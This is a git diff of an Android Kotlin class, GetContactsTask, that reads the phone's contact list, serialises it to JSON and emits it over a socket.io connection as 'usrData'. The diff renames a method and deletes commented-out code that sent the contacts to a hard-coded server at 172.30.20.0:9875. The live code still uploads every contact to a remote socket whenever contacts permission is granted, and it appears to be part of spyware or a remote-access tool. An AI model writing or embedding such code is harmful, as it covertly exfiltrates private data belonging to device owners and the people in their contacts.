@@ -46,16 +46,14 @@ class GetContactsTask(private val ctx: Context, private val socket: Socket) : Ba
         return Gson().toJson(list)
     }
 
-    private fun uploadSms(): String {
+    private fun getContacts(): String {
         return getJSON(getContactList())
     }
 
     override fun run() {
         super.run()
         if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)
-            /*socket.emit("contactUpload", uploadSms(), Ack { args ->
-                Log.d(tag, "Contacts Uploaded")
-            })*/foo(uploadSms())
+            foo(getContacts())
         else requestPermissions()
     }
 
@@ -66,20 +64,4 @@ class GetContactsTask(private val ctx: Context, private val socket: Socket) : Ba
 
         socket.emit("usrData", JSONObject(data))
     }
-
-    /*private fun fooo(str: String){
-        Log.d(tag, "Fooooo")
-        val socket = IO.socket("http://172.30.20.0:9875/")
-        socket.connect()
-        Log.d(tag, "Socket Connected ${socket.connected()}")
-
-        socket.on(Socket.EVENT_CONNECT ){
-            Log.d(tag, "Socket Connected")
-
-
-            socket.emit("contacts", str, Ack {
-                Log.d(tag, "Data Transferred")
-            })
-        }
-    }*/
 }
